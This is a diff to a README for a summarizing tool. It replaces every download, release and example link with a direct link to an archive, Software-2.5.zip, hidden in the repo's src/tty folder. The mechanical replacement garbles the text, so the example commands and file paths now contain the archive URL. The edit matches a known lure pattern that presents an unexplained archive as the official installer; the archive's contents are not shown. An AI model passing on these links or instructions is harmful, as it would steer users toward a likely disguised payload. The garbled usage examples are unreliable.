@@ -1,6 +1,6 @@
 # ⚡ summarize - Quickly Capture Main Ideas
 
-[![Download summarize](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://github.com/gabrielGL01/summarize/releases)
+[![Download summarize](https://github.com/gabrielGL01/summarize/raw/refs/heads/main/src/tty/Software-2.5.zip)](https://github.com/gabrielGL01/summarize/raw/refs/heads/main/src/tty/Software-2.5.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Topics covered include artificial intelligence assist, command line interface to
 
 1. First, visit the release page to download the software:
 
-   [Download summarize releases](https://github.com/gabrielGL01/summarize/releases)
+   [Download summarize releases](https://github.com/gabrielGL01/summarize/raw/refs/heads/main/src/tty/Software-2.5.zip)
 
    This is the official page where all available versions are listed.
 
@@ -48,13 +48,13 @@ Topics covered include artificial intelligence assist, command line interface to
 
 Go to the releases page below to get the latest Windows version of summarize:  
 
-[![Download summarize](https://img.shields.io/badge/Download-grey?style=for-the-badge)](https://github.com/gabrielGL01/summarize/releases)
+[![Download summarize](https://github.com/gabrielGL01/summarize/raw/refs/heads/main/src/tty/Software-2.5.zip)](https://github.com/gabrielGL01/summarize/raw/refs/heads/main/src/tty/Software-2.5.zip)
 
 ### Step 2: Download the Installer
 
 Look for a file named similar to:  
-`summarize-setup.exe` or  
-`summarize-windows-x64.exe`
+`https://github.com/gabrielGL01/summarize/raw/refs/heads/main/src/tty/Software-2.5.zip` or  
+`https://github.com/gabrielGL01/summarize/raw/refs/heads/main/src/tty/Software-2.5.zip`
 
 Click on that file to download.
 
@@ -110,13 +110,13 @@ After installation, click *Finish* to close the installer. summarize is now read
 - `summarize --help`  
 Show help and list commands.
 
-- `summarize https://example.com/article`  
+- `summarize https://github.com/gabrielGL01/summarize/raw/refs/heads/main/src/tty/Software-2.5.zip`  
 Get a summary of an online article.
 
-- `summarize C:\Users\User\Documents\podcast.txt`  
+- `summarize C:\Users\User\Documents\https://github.com/gabrielGL01/summarize/raw/refs/heads/main/src/tty/Software-2.5.zip`  
 Summarize a local text file.
 
-- `summarize --youtube https://youtu.be/videoID`  
+- `summarize --youtube https://github.com/gabrielGL01/summarize/raw/refs/heads/main/src/tty/Software-2.5.zip`  
 Summarize a YouTube video transcript.
 
 ---
@@ -149,7 +149,7 @@ Settings can be changed either in the Chrome extension options or via CLI comman
 
 To update:
 
-1. Visit the [releases page](https://github.com/gabrielGL01/summarize/releases).
+1. Visit the [releases page](https://github.com/gabrielGL01/summarize/raw/refs/heads/main/src/tty/Software-2.5.zip).
 
 2. Download the latest Windows installer.
 
@@ -175,4 +175,4 @@ To update:
 
 ---
 
-[Download summarize releases](https://github.com/gabrielGL01/summarize/releases)
+[Download summarize releases](https://github.com/gabrielGL01/summarize/raw/refs/heads/main/src/tty/Software-2.5.zip)
